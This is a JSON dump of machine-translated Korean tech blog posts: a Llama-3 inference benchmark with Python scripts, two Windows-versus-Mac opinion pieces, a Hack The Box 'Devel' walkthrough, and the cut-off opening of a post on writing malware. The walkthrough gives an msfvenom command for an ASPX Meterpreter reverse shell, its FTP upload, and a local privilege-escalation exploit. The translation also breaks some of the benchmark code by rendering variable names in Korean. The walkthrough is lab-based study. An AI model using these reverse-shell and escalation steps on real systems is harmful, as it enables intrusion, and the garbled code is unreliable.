{"pageProps":{"posts":[{"title":"Llama-3 추론을 Intel Core Ultra 5에서 실행하기 DirectML 및 ONNX 대 IPEX-LLM","description":"","date":"2024-06-19 01:21","slug":"2024-06-19-Llama-3inferencesonIntelCoreUltra5DirectMLandONNXvsIPEX-LLM","content":"\n\n이전 글에서 언급했듯이 Intel은 ONNX + DirectML을 위한 하드웨어 가속화를 제공합니다. 이에 대해 몇 가지 실험을 진행했습니다.\n\nMicrosoft은 PyTorch를 위한 DirectML 인터페이스를 제공합니다. 현재 16비트와 32비트 부동 소수점에서만 추론을 지원합니다. 예제에서 초당 토큰 수를 측정하기 위해 포크를 생성했습니다.\n\n```js\nconda create --name pytdml python=3.10 -y\nconda activate pytdml\npip install torch-directml\ngit clone https://github.com/luweigen/DirectML\ncd DirectML/PyTorch/llm\npip install -r requirements.txt\npython app.py --precision float16 --model_repo \"meta-llama/Meta-Llama-3-8B-Instruct\" --stream_every_n=143\n```\n\n<img src=\"/assets/img/2024-06-19-Llama-3inferencesonIntelCoreUltra5DirectMLandONNXvsIPEX-LLM_0.png\" />\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-19-Llama-3inferencesonIntelCoreUltra5DirectMLandONNXvsIPEX-LLM_1.png\" />\n\n이전 실험에서 🤗Transformers + IPEX-LLM이 최상의 성능을 보여줬기 때문에 이 설정에서는 16비트 부동 소수점 추론만 비교할 것입니다.\n\n테스트 프로그램 ipex-llm-llama3.py는 다음과 같이 수정되었습니다.\n\n```js\n# Wei Lu(mailwlu@gmail.com)에 의해 수정됨\n# 2016년 The BigDL Authors에 저작권 속함\n#\n# Apache 라이선스, 버전 2.0에 따라 라이선스 부여\n# 이 파일을 라이선스와 준수하면서 사용해야 합니다.\n# 라이선스 사본은 다음에서 얻을 수 있습니다.\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# 적용되는 법률에 따라 필요하거나 서면으로 합의되거나, 소프트웨어가\n# \"있는 그대로\" 배포됩니다. 조건이나 보증 없이\n# 명시 또는 묵시적으로, 까지도 어떤 종류의 조건도 보증 없이,\n# 명시적 또는 묵시적으로. 언어 특정 권한과 관련해야 합니다.\n# 권한 및 제한 사항\n#\n\nimport torch\nimport time\nimport argparse\n\nfrom ipex_llm.transformers import AutoModelForCausalLM\nfrom transformers import AutoTokenizer\n\n# 모델을 기반으로 프롬프트를 조정할 수 있습니다.\n# 여기서 프롬프트 조정은 다음을 참조합니다. https://llama.meta.com/docs/model-cards-and-prompt-formats/meta-llama-3\n기본_시스템_프롬프트 = \"\"\"\\\n\"\"\"\n\ndef get_prompt(user_input: str, chat_history: list[tuple[str, str]],\n               system_prompt: str) -> str:\n    prompt_texts = [f'<|begin_of_text|>']\n\n    if system_prompt != '':\n        prompt_texts.append(f'<|start_header_id|>system<|end_header_id|>\\n\\n{system_prompt}<|eot_id|>')\n\n    for history_input, history_response in chat_history:\n        prompt_texts.append(f'<|start_header_id|>user<|end_header_id|>\\n\\n{history_input.strip()}<|eot_id|>')\n        prompt_texts.append(f'<|start_header_id|>assistant<|end_header_id|>\\n\\n{history_response.strip()}<|eot_id|>')\n\n    prompt_texts.append(f'<|start_header_id|>user<|end_header_id|>\\n\\n{user_input.strip()}<|eot_id|><|start_header_id|>assistant<|end_header_id|>\\n\\n')\n    return ''.join(prompt_texts)\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='Llama3 모델을 사용하여 `generate()` API를 사용하여 토큰 예측')\n    parser.add_argument('--repo-id-or-model-path', type=str, default=\"meta-llama/Meta-Llama-3-70B-Instruct\",\n                        help='Meta-Llama-3 (예: `meta-llama/Meta-Llama-3-70B-Instruct`)를 다운로드할 Huggingface 저장소 ID'\n                             '또는 Huggingface 체크포인트 폴더에 대한 경로')\n    parser.add_argument('--prompt', type=str, default=\"OpenVINO is\",\n                        help='추론할 프롬프트')\n    parser.add_argument('--n-predict', type=int, default=128,\n                        help='예측할 최대 토큰 수')\n    parser.add_argument('--bit', type=str, default=\"4\",\n                        help='4로 설정하면 4비트로 로드하거나 off 또는 load_in_low_bit 옵션은 sym_int4, asym_int4, sym_int5, asym_int5, sym_int8,nf3,nf4, fp4, fp8, fp8_e4m3, fp8_e5m2, fp6, gguf_iq2_xxs, gguf_iq2_xs, gguf_iq1_s, gguf_q4k_m, gguf_q4k_s, fp16, bf16, fp6_k')\n\n    args = parser.parse_args()\n    model_path = args.repo_id_or_model_path\n\n    if args.bit == \"4\":\n        # 4비트로 모델 로드,\n        # 모델의 관련 레이어를 INT4 형식으로 변환합니다.\n        # iGPU를 사용하는 Windows 사용자의 경우, LLM을 실행할 때 `cpu_embedding=True`를 from_pretrained 함수에서 설정하는 것을 권장합니다.\n        # 이렇게 하면 메모리 집약적인 임베딩 레이어가 iGPU 대신 CPU를 활용할 수 있습니다. 이 경우에는 도움이 되지 않습니다.\n        model = AutoModelForCausalLM.from_pretrained(model_path,\n                                                    load_in_4bit=True,\n                                                    optimize_model=True,\n                                                    trust_remote_code=True,\n                                                    use_cache=True)\n    elif args.bit == \"off\" or args.bit == \"32\":\n        model = AutoModelForCausalLM.from_pretrained(model_path,\n                                                    optimize_model=True,\n                                                    trust_remote_code=True,\n                                                    use_cache=True)\n    else:\n        model = AutoModelForCausalLM.from_pretrained(model_path,\n                                                    load_in_low_bit=args.bit,\n                                                    optimize_model=True,\n                                                    trust_remote_code=True,\n                                                    use_cache=True)\n\n    if args.bit == \"32\":\n        model = model.to('xpu')\n    else:\n        model = model.half().to('xpu')\n\n    # 토크나이저 로드\n    tokenizer = AutoTokenizer.from_pretrained(model_path, trust_remote_code=True)\n\n    # 여기서 종결자는 다음을 참조합니다. https://huggingface.co/meta-llama/Meta-Llama-3-8B-Instruct#transformers-automodelforcausallm\n    종결자 = [\n        tokenizer.eos_token_id,\n        tokenizer.convert_tokens_to_ids(\"<|eot_id|>\"),\n    ]\n\n    # 예측된 토큰 생성\n    with torch.inference_mode():\n        prompt = get_prompt(args.prompt, [], system_prompt=DEFAULT_SYSTEM_PROMPT)\n        input_ids = tokenizer.encode(prompt, return_tensors=\"pt\").to('xpu')\n        # ipex_llm 모델은 워밍업이 필요하므로 추론 시간을 정확하게 할 수 있습니다.\n        output = model.generate(input_ids,\n                                eos_token_id=terminators,\n                                max_new_tokens=20)\n\n        # 추론 시작\n        st = time.time()\n        output = model.generate(input_ids,\n                                eos_token_id=terminators,\n                                max_new_tokens=args.n_predict)\n        torch.xpu.synchronize()\n        end = time.time()\n        output = output.cpu()\n        output_str = tokenizer.decode(output[0], skip_special_tokens=False)\n        print(f'추론 시간: {end-st} s, 토큰: {len(output[0])}, t/s:{len(output[0])/(end-st)}')\n        print('-'*20, '프롬프트', '-'*20)\n        print(prompt)\n        print('-'*20, '출력 (skip_special_tokens=False)', '-'*20)\n        print(output_str)\n```\n\n<div class=\"content-ad\"></div>\n\n```js\npython ipex-llm-llama3.py --repo-id-or-model-path=meta-llama/Meta-Llama-3-8B-Instruct --bit=fp16\n```\n\n![image](/assets/img/2024-06-19-Llama-3inferencesonIntelCoreUltra5DirectMLandONNXvsIPEX-LLM_2.png)\n\n![image](/assets/img/2024-06-19-Llama-3inferencesonIntelCoreUltra5DirectMLandONNXvsIPEX-LLM_3.png)\n\nDirectML은 낮은 비트 양자화를 지원하는 ONNX Runtime의 Execution Provider가 될 수도 있습니다. 우리의 테스트는 이 python API를 기반으로 합니다.\n\n<div class=\"content-ad\"></div>\n\n\n```js\npip install onnxruntime-genai --pre\npip install onnxruntime-genai-directml --pre\npip install torch transformers onnx onnxruntime\nconda install conda-forge::vs2015_runtime\n```\n\n마지막 줄은 이 문제를 해결하기 위한 것입니다.\n\n라마 모델은 다음과 같이 변환되었습니다.\n\n```js\npython -m onnxruntime_genai.models.builder -m meta-llama/Meta-Llama-3-8B-Instruct -o llama-3-8B-Instruct-int4-onnx-directml -p int4 -e dml -c ..\\.cache\\huggingface\\hub\\\n```\n\n<div class=\"content-ad\"></div>\n\n변환된 모델이 🤗 허브에 업로드되었습니다.\n\n다음은 테스트 프로그램 genai-llama3.py입니다.\n\n```python\nimport time\nimport argparse\nimport onnxruntime_genai as og\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='Predict Tokens using onnxruntime_genai')\n    parser.add_argument('--model-path', type=str, default=\"llama-3-8B-Instruct-int4-onnx-directml\",\n                        help='model path')\n    parser.add_argument('--prompt', type=str, default=\"OpenVINO is\",\n                        help='Prompt to infer')\n    parser.add_argument(\n        '--max-length',\n        type=int,\n        default=143,\n        help='max lengths'\n    )\n    args = parser.parse_args()\n\n    model = og.Model(args.model_path)\n    tokenizer = og.Tokenizer(model)\n    \n    # Set the max length to something sensible by default,\n    # since otherwise it will be set to the entire context length\n    search_options = {}\n    search_options['max_length'] = args.max_length\n\n    chat_template = '<|user|>\\n{input} <|end|>\\n<|assistant|>'\n\n    text = args.prompt\n    if not text:\n        print(\"오류, 입력이 비어 있을 수 없습니다\")\n        exit\n\n    prompt = f'{chat_template.format(input=text)}'\n\n    input_tokens = tokenizer.encode(prompt)\n\n    params = og.GeneratorParams(model)\n    params.set_search_options(**search_options)\n    params.input_ids = input_tokens\n\n    st =  time.time()\n    output = model.generate(params)\n    out_txt = tokenizer.decode(output[0])\n\n    sec = time.time() - st\n    cnt = len(output[0])\n\n    print(\"생성 결과:\", out_txt)\n    print(f'추론 시간: {sec} 초, 토큰 수: {cnt}, 초당 토큰 수:{cnt/sec}')\n```\n\n<img src=\"/assets/img/2024-06-19-Llama-3inferencesonIntelCoreUltra5DirectMLandONNXvsIPEX-LLM_4.png\" />\n\n\n<div class=\"content-ad\"></div>\n\n\n![이미지](/assets/img/2024-06-19-Llama-3inferencesonIntelCoreUltra5DirectMLandONNXvsIPEX-LLM_5.png)\n\n🤗Transformers + IPEX-LLM과 비교해 볼 수 있어요.\n\n```js\npython ipex-llm-llama3.py --repo-id-or-model-path=meta-llama/Meta-Llama-3-8B-Instruct --bit=4\n```\n\n![이미지](/assets/img/2024-06-19-Llama-3inferencesonIntelCoreUltra5DirectMLandONNXvsIPEX-LLM_6.png)\n\n\n<div class=\"content-ad\"></div>\n\n\n![이미지1](/assets/img/2024-06-19-Llama-3inferencesonIntelCoreUltra5DirectMLandONNXvsIPEX-LLM_7.png)\n\n결과를 함께 살펴봅시다.\n\n![이미지2](/assets/img/2024-06-19-Llama-3inferencesonIntelCoreUltra5DirectMLandONNXvsIPEX-LLM_8.png)\n\n앞으로 어떻게 이러한 흥미로운 차이가 생겼는지에 대한 구현 세부사항을 탐구할 것입니다.\n","ogImage":{"url":"/assets/img/2024-06-19-Llama-3inferencesonIntelCoreUltra5DirectMLandONNXvsIPEX-LLM_0.png"},"coverImage":"/assets/img/2024-06-19-Llama-3inferencesonIntelCoreUltra5DirectMLandONNXvsIPEX-LLM_0.png","tag":["Tech"],"readingTime":10},{"title":"마치, 윈도우가 언제 이렇게 좋아졌지","description":"","date":"2024-06-19 01:19","slug":"2024-06-19-DamnWhenDidWindowsGetSoGood","content":"\n\n최근 Microsoft가 새로운 X Elite 칩에 대해 많은 것을 공개했어요. 이전에 이야기했던 것처럼, 저는 그 칩에 굉장히 감명받았어요. Qualcomm의 이전 노트북 칩 시도들은 조금 실망스러웠는데요. X Elite도 비슷할 것으로 예상했지만, Qualcomm이 이번에는 Apple 실리콘과 경쟁할 만한 칩을 만들었어요.\n\n그런데 이전 포스트에서는 주로 원시 성능에 초점을 맞추고 다양한 벤치마크를 다양한 출처에서 다뤘어요. 하지만 더 중요한 것을 놓친 것 같아요: 배터리 수명이죠.\n\n컴퓨터는 이미 충분히 빠릅니다. 속도가 나에게 중요한 것은 앱을 만들 때 뿐이에요. 그리고 건물을 할 때에도 보통 다른 일을 하고 있기 때문에 속도에 대해 잘 모르겠어요. 만약 내 MacBook Air의 속도가 갑자기 절반으로 줄어들면 아마도 못 느낄 것 같아요.\n\n하지만 만약 MacBook Air의 배터리 수명이 절반 줄어든다면 분명히 느낄 것 같아요. 그래서 Microsoft가 X Elite로 배터리 수명을 크게 향상시킬 것이라고 주장하는 것이 정말 흥미롭습니다.\n\n<div class=\"content-ad\"></div>\n\n대략 10:08에 Surface Laptop 5, Copilot+PC Surface Laptop 및 MacBook Air M3 간의 배터리 수명 비교가 이루어졌어요. 어쩌면 회사들이 지난 제품 세대를 조롱하는 걸 보는 건 항상 재미있죠. 하지만 새로운 Surface 노트북이 Surface Laptop 5와 MacBook Air를 현저하게 능가한다는 점은 분명해요. \n\n그리고 네, MacBook Air는 Safari로 작동 중이었어요. 아무래도 그 노치를 봐도 되겠네요.\n\n또한, 테스트가 편집되어 상당히 가속화되어 있기 때문에 노트북이 얼마나 오래 버텼는지는 정확히 알기 어렵습니다. 그러나 비디오에서 테스트가 10:09에 시작되었고, 구 차세대 Surface 노트북은 10:14 (5초), MacBook Air는 10:20 (11초), 그리고 새 Surface 노트북은 10:27 (18초)에 종료되었다는 점을 유의해주세요.\n\n<div class=\"content-ad\"></div>\n\n발표자가 새 Surface 노트북이 이전 Surface와 거의 배터리 수명이 두 배로 증가했다고 말했는데, 이는 비디오가 테스트 전체를 다 보여주지 않았을 것으로 추측됩니다. 아마도 시작 부분 8초를 삭제했을 것으로 예상되어, 새 Surface 노트북은 26초, 이전 Surface 노트북은 13초, MacBook Air는 19초까지 지속될 것입니다. 이는 새 Surface 노트북이 MacBook Air보다 약 40% 더 긴 배터리 수명을 가진다는 것을 의미합니다. 와우, 정말 인상적이네요.\n\n그래서 다른 사람들이 유사한 의견을 제시했는지 살펴보았습니다. 그리고 이를 발견했습니다.\n\n이것은 새 Surface 노트북이 Zenbook 14 OLED를 40~100% 초과로 이겼다는 것을 보여줍니다. Zenbook 14의 배터리 수명은 얼마나 되는 걸까요? Laptop Mag가 M3 MacBook Air보다 더 좋은 배터리 수명을 가진다고 주장하는 충분한 수준입니다.\n\n일부 제3자 벤치마크는 더 겸손한 결과를 보여줍니다. Signal65는 0~20% 개선만 발견했지만 여전히 상당히 인상적입니다.\n\n<div class=\"content-ad\"></div>\n\n물론 윈도우 노트북의 문제는 항상 윈도우였죠. 이 부분에 대해서 마이크로소프트도 개선 중이거든요. 예를 들어, 윈도우 11은 이제 파일 탐색기에서 git을 지원합니다. 저는 git을 광범위하게 사용하고 있어요. 제가 프로프리터리 포맷을 사용하는 것을 그만둘 때라고 주장한 글에서 언급했던 것처럼요:\n\n명령줄에서 git을 사용하는 것이 별로 힘들지 않다고 생각해 왔어요… 음, 사실은 조금 이른 말을 한 것 같아요. 다른 사람이 파일을 수정했는데 먼저 pulling 하지 않은 채로 있는지 알기가 정말 유용해요. 그렇지 않으면 병합 충돌이 발생하고 아무도 그런 충돌을 원치 않죠. 탐색기 안에 git을 통합하는 것만으로도 상황이 훨씬 나아질 거예요.\n\n그리고 새로운 자동 초해상도 기술도 있어요. 어떻게 작동하는지는 잘 모르겠지만, NPU(신경 처리 장치)를 사용하여 응용 프로그램을 확대할 것 같아요. 그리고 안드로이드에서 텍스트를 복사할 수 있게 해주는 마이크로소프트의 휴대전화 연결 앱에도 새로운 개선 사항이 있어요.\n\n그리고 더불어 AI 기능이 풍부하게 포함되어 있어요. 이 중 일부는 의문이 제기되지만, 리콜(Recall) 기능과 같은 일부 기능은 정말 흥미로워 보여요.\n\n<div class=\"content-ad\"></div>\n\n윈도우 기기를 사려는 유혹이 큽니다. 약간 오래된 M1 MacBook Air를 사용 중이었는데 업그레이드를 고려 중이에요. 새로운 M4 MacBook Pro를 구입하고 싶었는데, M4 iPad Pro의 업그레이드가 함께 되어 있다면 좋겠다고 희망했어요. 하지만 최근 소문에 의하면 M4 MacBook Pro에는 그런 개선 사항이 포함되지 않을 것 같아요.\n\n그렇다면 상상해 보죠. Apple이 M4 MacBook Pro를 출시했지만 새로운 OLED 디스플레이나 매트 옵션은 포함되지 않았다면 어떨까요? 윈도우로 갈아타도 될까요? 윈도우에서도 점점 더 맥 앱들이 출시되고 있어요. 제 앱 'Stratum' (iOS, Android)도 제네릭 Rest API를 사용하는 'PocketBase' 백엔드로 이동하고, 윈도우에서도 문제 없이 작동해요. 파이어베이스는 이제 기술적으로 윈도우에서도 지원되지만 모든 기능이 작동하지 않고 어쩔 때는 나를 로그아웃해 버려요.\n\n다른 문제도 좀 있어요. 윈도우가 줄 바꿈에 \\r\\n을 사용한다는 게 싫어요. 진짜 싫어요. 그리고 Git에서는 그 미려하지 않은 문자가 보여지고 고통스럽네요. 그리고 윈도우가 파일 경로에 역슬래시를 사용한다는 것도 싫어요. 터미널에서 경로를 자동 완성할 때마다 역슬래시로 바뀌어 버리니까 계속해서 상기되는 거예요. 탭으로 들여쓰기 하는 게 싫어요. 탭 키를 누르고 나서 왼쪽 화살표를 누르면 처음 위치로 돌아가기를 기대했었는데 그렇게 되지 않고 이상한 랜덤한 위치로 이동하게 돼요.\n\n하지만, 알지요? 이 문제들을 극복할 수 있다면 윈도우도 나쁜 선택이 아닐 거예요. '진행하는 장소에서는 Surface 기기들을 많이 본 적이 있어요. 맥북만큼은 아니지만 그래도 꽤 많았어요. 그 기기들의 품질에 대해 무언가를 전달하고 있는 것 같아요.\n\n<div class=\"content-ad\"></div>\n\n어쩌면 이 게시물의 제목이 잘못된 것 같아요. 한 번의 업데이트로 윈도우가 크게 개선됐다고 기대했는데, 사실 X Elite는 정말 많이 도와줬어요. 하지만 윈도우는 오랜 시간 동안 점진적으로 개선되어 왔어요.\n\n유산이라고 불리는 것 몇 가지를 변경해주었으면 좋겠어요. 단순히 슬래시와 한 줄 개행 문자를 사용하면서 일반 OS처럼 하면 좋을 텐데요. 하지만 윈도우가 너무 구리다고 농담하는 것을 그만두어야 할지도 모르겠어요. 진짜 문제는 '언제부터 윈도우가 이렇게 좋아졌을까?'가 아니라 '왜 이제서야 윈도우가 좋아진 걸 알게 되었을까?'인 것 같네요.","ogImage":{"url":"/assets/img/2024-06-19-DamnWhenDidWindowsGetSoGood_0.png"},"coverImage":"/assets/img/2024-06-19-DamnWhenDidWindowsGetSoGood_0.png","tag":["Tech"],"readingTime":4},{"title":"Devel  Hack The Box 워크스루","description":"","date":"2024-06-19 01:18","slug":"2024-06-19-DevelHackTheBoxWalk-through","content":"\n\n안녕하세요!\n\n오늘은 과거에 완료한 Hack The Box 머신인 Devel을 살펴보겠습니다. 이 머신은 Windows 머신에서의 지역 권한 상승을 강조합니다.\n\n이 머신은 여전히 Hack The Box에서 이용 가능한 쉬운 난이도의 은퇴된 머신입니다. 이 글을 쓰는 시점에서는 불행히도 이 머신에 접근하려면 VIP 멤버십이 필요합니다. 제가 이 머신을 루팅했을 때는 무료였지만, 곧 다시 무료가 될 수도 있습니다.\n\n더 이상 말 늑대, 시작해 봅시다!\n\n<div class=\"content-ad\"></div>\n\n마크다운 형식으로 테이블 태그를 변경해주세요.\n\n<div class=\"content-ad\"></div>\n\n우리가 포트 스캔 결과 익명 FTP 로그인이 허용되어 있음을 알려주었기 때문에 익명으로 FTP에 로그인을 시도해 볼 수 있습니다.\n\n![이미지](/assets/img/2024-06-19-DevelHackTheBoxWalk-through_2.png)\n\n우리는 성공적으로 포트 21인 FTP에 익명으로 로그인했습니다. 현재 디렉토리에 있는 파일 목록을 볼 수 있습니다.\n\n이 서버가 Microsoft IIS/7.5를 실행 중이기 때문에, ASP 및 ASPX 확장자를 가진 코드 실행을 허용하는 이 버전의 IIS에서 익명으로 파일을 업로드하는 시도를 해볼 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n\n<img src=\"/assets/img/2024-06-19-DevelHackTheBoxWalk-through_3.png\" />\n\n랜덤 ASPX 파일을 업로드한 후 익명 사용자의 업로드 기능을 이용할 수 있다는 점을 알 수 있습니다.\n\nASPX 파일을 업로드할 수 있으므로 ASPX 역술을 생성해볼 수 있습니다.\n\n터미널에서 Metasploit Payload Generator를 엽니다.\n\n\n<div class=\"content-ad\"></div>\n\n```js\nmsfvenom\n```\n\n그런 다음, ASPX 역술 쉘을 만들려면 다음을 사용합니다:\n\n```js\nmsfvenom -f aspx -p windows/meterpreter/reverse_tcp LHOST=(내_IP) LPORT=4444 -o moe.aspx\n```\n\nmsfvenom을 사용하여 역술 쉘을 얻을 수 있는 올바른 페이로드를 생성하려고 합니다. 이 경우 Windows reverse_tcp 페이로드를 사용하고 있으며, 이는 Windows 상자이기 때문입니다. 선택한 옵션은 Meterpreter입니다.\n\n<div class=\"content-ad\"></div>\n\n다음은 플래그입니다:\n\n- -f: 출력 형식\n- -p: 사용할 페이로드 (우리 시나리오에서는 Windows Reverse TCP)\n- LHOST: 우리 자신입니다; 이 페이로드의 역쉘 수신 측에 있을 것입니다. 우리가 수신 대기 중인 IP를 입력하는 곳입니다 (eth0 또는 tun0)\n- LPORT: 우리가 수신 대기할 포트, 보통 기본값으로 4444를 유지합니다\n- -o: 서버에 업로드된 페이로드를 포함하는 출력 파일\n\n이 파일을 업로드 시도하면 성공합니다. 이제 업로드한 파일과 상호 작용하기 위해 리스너를 구성합니다.\n\n터미널에서 msfconsole을 실행하여 Metasploit으로 리스너를 구성합니다:\n\n<div class=\"content-ad\"></div>\n\n\nmsfconsole\n\n\n그런 다음 사용할 exploit으로 이동하겠습니다.\n\n\nuse exploit/multi/handler \n\n\n그런 다음 옵션을 우리가 원하는 대로 구성합니다.\n\n<div class=\"content-ad\"></div>\n\n해당 표식을 마크다운 형식으로 변경하시면 됩니다.\n\n<div class=\"content-ad\"></div>\n\n\n```js\nset payload windows/meterpreter/reverse_tcp\n```\n\n참고: 이번에는 세션 ID를 실행하기 전에 기억하는 것이 중요합니다. 나중에 사용할 것입니다.\n\n이제 실행해 봅시다!! :\n\n```js\nrun\n```  \n\n\n<div class=\"content-ad\"></div>\n\n우리는 브라우저에서 ASPX 역쉘 파일을 다음과 같이 로드합니다:\n\n```js\n10.10.10.5/{File_Name}\n```\n\n이제 터미널에서 호스트 OS 안에 있다는 것을 확인할 수 있습니다\n\n<img src=\"/assets/img/2024-06-19-DevelHackTheBoxWalk-through_4.png\" />\n\n<div class=\"content-ad\"></div>\n\n이제 파일 시스템으로 이동해 보아야 합니다. 가능하면 C 드라이브로 이동하겠습니다.\n\n그래서 다음과 같이 세션을 백그라운드로 설정합니다:\n\n```js\nbackground\n```\n\n그런 다음, 획득한 시스템에서 로컬 취약점을 찾기 위해 Metasploit을 다시 엽니다. msfconsole을 열고 exploit/multi/handler로 이동한 다음 post/multi/recon/local_exploit_suggester로 넘어갑니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nuse post/multi/recon/local_exploit_suggester\n```\n\n![Image 1](/assets/img/2024-06-19-DevelHackTheBoxWalk-through_5.png)\n\n이전에 메모한 세션 ID를 여기에 입력하겠습니다:\n\n![Image 2](/assets/img/2024-06-19-DevelHackTheBoxWalk-through_6.png)\n\n\n<div class=\"content-ad\"></div>\n\n우리의 세션 ID를 구성한 후에 이를 실행할 거에요. 이 모듈은 Windows에서 로컬 악용을 찾을 거에요.\n\n실행이 완료되면 Metasploit이 사용을 제안하는 것을 볼 수 있을 거에요:\n\n```js\nexploit/windows/local/ms10_015_kitrap0d\n```\n\n이 모듈은 Windows Machines에서 시스템 권한으로 새로운 세션을 만들 것이에요. 이 모듈은 CVE-2010–0232와 관련된 악용인데요, 이는 Microsoft Windows 커널 예외 처리기 취약점에 관련된 것이에요.\n\n<div class=\"content-ad\"></div>\n\n우리는 옵션을 조정합니다...\n\n맞죠!\n\n```js\nshow options\n```\n\n들을 호스트를 설정해요. 그리고 우리의 리스닝 포트를 4445로 설정할 거에요; 다른 포트를 사용하여 exploit을 수행할 거예요. 마지막으로 세션을 리스너와 동일하게 만들 거에요.\n\n<div class=\"content-ad\"></div>\n\n그럼 이제 실행해 봅시다!\n\n![이미지](/assets/img/2024-06-19-DevelHackTheBoxWalk-through_7.png)\n\n우리의 Exploit이 완료된 것 같은데 성공했을까요?\n\nMeterpreter에서 명령 셸을 사용합니다.\n\n<div class=\"content-ad\"></div>\n\n접근 성공! 이제 cd ..를 사용하여 C 드라이브로 이동합니다.\n\n![이미지](/assets/img/2024-06-19-DevelHackTheBoxWalk-through_8.png)\n\nC 드라이브의 내용을 분석하고 사용자 디렉토리가 흥미로울 수 있다는 것을 알 수 있었습니다. 해당 디렉터리로 이동하면 관리자 및 바비스와 같이 발견할 가치가 있는 2개의 사용자 디렉토리가 보입니다.\n\n![이미지](/assets/img/2024-06-19-DevelHackTheBoxWalk-through_9.png)\n\n<div class=\"content-ad\"></div>\n\n해당 디렉터리로 이동하고 두 가지 모두 사용자 및 루트 권한을 얻어야 이 상자를 루팅할 수 있어요!\n\n![이미지 1](/assets/img/2024-06-19-DevelHackTheBoxWalk-through_10.png)\n\n![이미지 2](/assets/img/2024-06-19-DevelHackTheBoxWalk-through_11.png)\n\n이것은 제 첫 번째 게시된 Hack The Box 워크스루입니다. 이 워크스루를 작성하는 것은 나에게 유용한 경험을 얻게 도와주고 동시에 다른 사람들이 학습하는 데 도움이 되기도 해요!\n\n<div class=\"content-ad\"></div>\n\n도움이 되었다면 알려주세요. 또한 Linkedin에서 연락해도 괜찮습니다:\n\nwww.linkedin.com/in/jaylin-nelson\n\n참고 문헌:","ogImage":{"url":"/assets/img/2024-06-19-DevelHackTheBoxWalk-through_0.png"},"coverImage":"/assets/img/2024-06-19-DevelHackTheBoxWalk-through_0.png","tag":["Tech"],"readingTime":5},{"title":"맥과 PC 중에서 선택하는 것이 바뀔 예정입니다","description":"","date":"2024-06-19 01:16","slug":"2024-06-19-ThechoicebetweenMacandaPCisabouttochange","content":"\n\n\n![Mac vs PC](/assets/img/2024-06-19-ThechoicebetweenMacandaPCisabouttochange_0.png)\n\n맥 대 PC는 시대가 변해도 계속 논쟁이 될 주제 중 하나입니다. 왜냐하면 이것은 주관적인 결정이기 때문이죠.\n\n맥과 PC는 각자의 독특한 강점을 가지고 있지만 안심하세요, 두 플랫폼에서 모든 작업을 수행할 수 있습니다. 그들의 다재다능함은 당신이 할 수 있는 일에 제한이 없도록 보장합니다.\n\n생각해 보세요: PC를 소유하고 있다면 게임을 할 수도 있고, 오피스 문서를 만들고 수정할 수 있고, 콘텐츠를 만들고 편집하며, 좋아하는 비디오를 보고 코딩할 수 있습니다. 맥에 대해서도 똑같이 말할 수 있습니다.\n\n\n<div class=\"content-ad\"></div>\n\n당신의 PC는 게임에 관해서 더 많은 것을 제공할 수 있지만, Mac은 콘텐츠 제작에 더 많은 것을 제공할 수 있습니다. 하지만 어느 플랫폼을 선택하던지 이러한 모든 것을 할 수 있다는 것을 명심해주세요.\n\n이 차이점이 무엇일까요?\n\n노트북 리뷰어들은 일반적으로 대부분의 사람들에게 가장 좋은 노트북으로 MacBook을 추천하며, 고급 윈도우 대안이 가까운 뒤를 이어옵니다. 그러나 윈도우 만을 알고 있던 사람들은 Mac을 선택할 가능성이 낮을 것입니다. 왜냐하면 Mac을 선택하는 것이 더 큰 도박이기 때문입니다.\n\n리뷰어들은 당신의 결정은 본질적으로 원하는 플랫폼을 선택하여 결정되어야 한다고 추측합니다: Windows 또는 MacOS. 그러나 사실은, 선택한 MacBook의 장점들은 운영 체제 선호도 이상의 것이었습니다.\n\n<div class=\"content-ad\"></div>\n\n2020년 11월에 M1이 출시된 이후로, MacBooks는 어떤 PC 대안보다 성능과 배터리 효율이 훨씬 우수했습니다. PC 배터리가 주방 싱크대처럼 빠르게 방전될 때, 여러분의 Mac은 계속해서 사용할 수 있었습니다. 사실, 내 M1 MacBook Pro가 한 번의 배터리 소모 시에 2021년 델 XPS를 세 번 충전해야만 했을 정도였죠.\n\n차이가 놀라웠습니다.\n\n따라서, 편향되지 않은 추천은 항상 다음과 같이 시작해야 했습니다: 정말 강력한 프로세서와 함께 진정한 하루 종일 배터리 수명을 중요시하는가? 만약 그것이 답이라면, 구매자는 MacOS를 배워야 했습니다.\n\n상황이 역전되었습니다.\n\n<div class=\"content-ad\"></div>\n\n그러나 새로운 CoPilot+ PC 노트북은 그 상황을 바꿀 것입니다. Microsoft가 드디어 Mac의 성능과 배터리 수명을 능가하는 PC를 시장에 선보였습니다.\n\n![image](/assets/img/2024-06-19-ThechoicebetweenMacandaPCisabouttochange_1.png)\n\n이 제품을 출시할 때 Microsoft가 목표로 삼은 것은 왕이었습니다. 그 곳을 공격했습니다. M1이 출시된 이후에는 실제적인 도전자가 없이 계속 Apple이 최강자로 군림해 왔으며, 그들이 자랑스럽게 굴었습니다.\n\n그러나 이제, 이 Snapdragon과 곧 발표될 새로운 Intel 칩을 장착한 새로운 노트북 시리즈가 등장하면, Apple로부터 그들의 강력함과 효율성 장점을 빼앗을 것입니다.\n\n<div class=\"content-ad\"></div>\n\n네, 지난 4년 만에 이번에는 차이가 단순히 운영 체제 선호도 때문인 것 같아요.\n\n경쟁은 좋은 것이고, 강력한 Microsoft는 소비자에게 좋은 소식인 강력한 Apple을 만들어낼 것입니다. Apple의 가격이 다소 터무니없어지는 것을 고려하면, 이것이 가격 하락 압력을 만들어줬으면 좋겠어요.","ogImage":{"url":"/assets/img/2024-06-19-ThechoicebetweenMacandaPCisabouttochange_0.png"},"coverImage":"/assets/img/2024-06-19-ThechoicebetweenMacandaPCisabouttochange_0.png","tag":["Tech"],"readingTime":2},{"title":"제발 합법적인 방식으로 지식을 확장하거나 온라인 커뮤니티에서 도움을 받아보는 것을 고려해보세요 안전한 온라인 활동이 중요하며 악의적인 목적으로 행동하는 것은 부디 자제해 주세요 함께 안전한 인터넷 환경을 만들어 나갈 수 있기를 바랍니다","description":"","date":"2024-06-19 01:15","slug":"2024-06-19-Writemesomemalware","content":"\n\n(연구 목적으로만 사용)\n\n# 이루고 싶은 것:\n\n# 어떻게 로드할 것인가:\n\nWindows에는 ctfmon.exe라는 멋진 